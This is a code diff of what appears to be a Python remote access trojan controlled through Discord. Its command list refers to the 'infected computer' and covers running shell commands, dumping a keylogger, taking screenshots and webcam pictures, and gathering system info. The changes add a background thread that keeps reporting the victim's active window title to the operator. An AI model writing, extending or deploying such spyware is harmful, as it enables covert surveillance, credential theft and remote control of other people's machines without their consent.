@@ -14,7 +14,7 @@ from ctypes import *
 import asyncio
 import discord
 from discord import utils
-token = '' #Insert your token here
+token = '' #Enter your token here
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
@@ -24,7 +24,9 @@ Availaible commands are :
 
 --> !message = Show a message box displaying your text / Syntax  = "!message example"
 --> !shell = Execute a shell command /Syntax  = "!shell whoami"
---> !window = Get infected computer user current active window
+--> !webcampic = Take a picture from the webcam
+--> !windowstart = Start logging current user window (logging is shown in the bot activity)
+--> !windowstop = Stop logging current user window 
 --> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
 --> !admincheck = Check if program has admin privileges
 --> !sysinfo = Gives info about infected computer
@@ -49,6 +51,24 @@ Availaible commands are :
 --> !screenshot = Get the screenshot of the user's current screen
 --> !exit = Exit program
 """
+
+async def activity(client):
+    import time
+    import win32gui
+    while True:
+        global stop_threads
+        if stop_threads:
+            break
+        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        game = discord.Game(f"Visiting: {window}")
+        await client.change_presence(status=discord.Status.online, activity=game)
+        time.sleep(1)
+
+def between_callback(client):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(activity(client))
+    loop.close()
 
 @client.event
 async def on_ready():
@@ -90,8 +110,9 @@ async def on_ready():
         await channel.send(f'{value1} | :gem:')
     elif is_admin == False:
         await channel.send(value1)
-
-
+    game = discord.Game(f"Window logging stopped")
+    await client.change_presence(status=discord.Status.online, activity=game)
+    
 def volumeup():
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -111,13 +132,13 @@ async def on_message(message):
     if message.channel.name != channel_name:
         pass
     else:
-        import win32gui
-        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-        game = discord.Game(f"Visiting: {window}")
-        await client.change_presence(status=discord.Status.online, activity=game)
         if message.content.startswith("!kill"):
-            channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
-            await channel_to_delete.delete()
+            try:
+                channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
+                await channel_to_delete.delete()
+                await message.channel.send(f"[*] {message.content[6:]} killed.")
+            except:
+                await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")
         if message.content == "!dumpkeylogger":
             import os
             temp = os.getenv("TEMP")
@@ -130,10 +151,20 @@ async def on_message(message):
             import sys
             sys.exit()
 
-        if message.content == "!window":
-            import win32gui
-            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-            await message.channel.send(f"[*] User current active window is : {window}")
+        if message.content == "!windowstart":
+            import threading
+            global stop_threads
+            stop_threads = False
+            global _thread
+            _thread = threading.Thread(target=between_callback, args=(client,))
+            _thread.start()
+            await message.channel.send("[*] Window logging for this session started")
+
+        if message.content == "!windowstop":
+            stop_threads = True
+            await message.channel.send("[*] Window logging for this session stopped")
+            game = discord.Game(f"Window logging stopped")
+            await client.change_presence(status=discord.Status.online, activity=game)
 
         if message.content == "!screenshot":
             import os
@@ -152,7 +183,7 @@ async def on_message(message):
             volumedown()
             await message.channel.send("[*] Volume put to 0%")
 
-        if message.content == "!webcampic": #Here we download a file over the internet to take a picture ,not very efficient but every other "pythonic" ways i've found of taking a picture requiered to add heavy modules which added dozens of mb to final exe if compiled so we'll roll with that
+        if message.content == "!webcampic":
             import os
             import urllib.request
             from zipfile import ZipFile
